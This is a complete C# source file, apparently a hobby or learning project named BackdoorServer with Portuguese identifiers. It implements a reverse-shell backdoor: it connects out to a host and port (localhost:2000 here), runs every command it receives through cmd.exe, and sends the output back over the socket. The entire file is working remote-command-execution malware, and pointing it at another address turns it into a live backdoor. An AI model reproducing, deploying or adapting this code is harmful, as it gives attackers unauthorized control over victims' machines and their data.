using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace BackdoorServer
{
    class Program
    {
        public static NetworkStream socket_server;
        public static void conectar(string ip, int porta)
        {
            TcpClient conectando = new TcpClient();
            conectando.Connect(ip, porta);
            socket_server = conectando.GetStream();
            receber();

        }
        public static void receber()
        {
            while (true)
            {
                try
                {
                    byte[] receber_bytes = new byte[1000];
                    socket_server.Read(receber_bytes, 0, receber_bytes.Length);
                    socket_server.Flush();
                    string msg = Encoding.ASCII.GetString(receber_bytes);
                    Console.WriteLine(msg);
                    enviar_comando(msg);
                }
                catch
                {
                    break;
                }
            }
        }
        public static void enviar_comando(string comando)
        {
            try
            {
                Console.WriteLine("excutando");
                Console.WriteLine(comando);
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C " + comando;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                using (Process process = Process.Start(startInfo))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();
                        int tamanho_cmando = result.Length;
                        string t_comando = Convert.ToString(tamanho_cmando);
                        byte[] rbytes = Encoding.ASCII.GetBytes(t_comando);
                        socket_server.Write(rbytes, 0, rbytes.Length);
                        socket_server.Flush();
                        Console.WriteLine(tamanho_cmando);
                        byte[] comandos = Encoding.ASCII.GetBytes(result);
                        socket_server.Write(comandos, 0, comandos.Length);
                        socket_server.Flush();

                    }
                }
            }
            catch
            {

            }
        }
        static void Main(string[] args)
        {
            conectar("127.0.0.1", 2000);

        }
    }
}
